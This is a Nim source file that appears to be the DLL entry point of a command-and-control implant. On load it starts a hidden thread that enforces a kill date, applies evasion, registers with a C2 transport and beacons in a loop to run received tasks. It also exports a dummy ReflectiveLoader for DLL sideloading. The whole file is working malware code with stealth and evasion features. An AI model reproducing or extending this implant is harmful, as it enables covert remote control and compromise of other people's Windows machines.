## Nim agent — Windows DLL entry point.
## Compiled with --app:lib; Nim generates DllMain → NimMain → module init.
## Module-level code starts the agent loop in a background thread so
## DllMain returns immediately (avoids loader-lock deadlock).
## Export: ReflectiveLoader (ordinal 1) for sideloading compatibility.

import std/[times, strutils, random]
import winim/lean
import config, transport, commands, evasion

proc agentThread(p: pointer): DWORD {.stdcall.} =
  randomize()

  when KillDate != "":
    try:
      let kd = parse(KillDate, "yyyy-MM-dd")
      if now() > kd: ExitProcess(0)
    except: discard

  applyEvasion()
  var t = newTransport()

  while not t.register():
    sleepMasked(30_000)

  while true:
    when KillDate != "":
      try:
        let kd = parse(KillDate, "yyyy-MM-dd")
        if now() > kd: ExitProcess(0)
      except: discard
    try:
      let tasks = t.beacon()
      for task in tasks:
        dispatchTask(t, task.id, task.typ, task.args, task.payload)
    except: discard
    sleepMasked(currentSleepMs())
  return 0

# Neutral export for sideloading (ordinal 1 / reflective loader naming)
proc ReflectiveLoader*() {.exportc, stdcall, dynlib.} = discard

# Module-level init — executes inside NimMain on DLL_PROCESS_ATTACH.
# CreateThread returns before the thread runs, so DllMain exits cleanly.
let dllHThread = CreateThread(nil, 0,
  cast[LPTHREAD_START_ROUTINE](agentThread), nil, 0, nil)
if dllHThread != 0: discard CloseHandle(dllHThread)
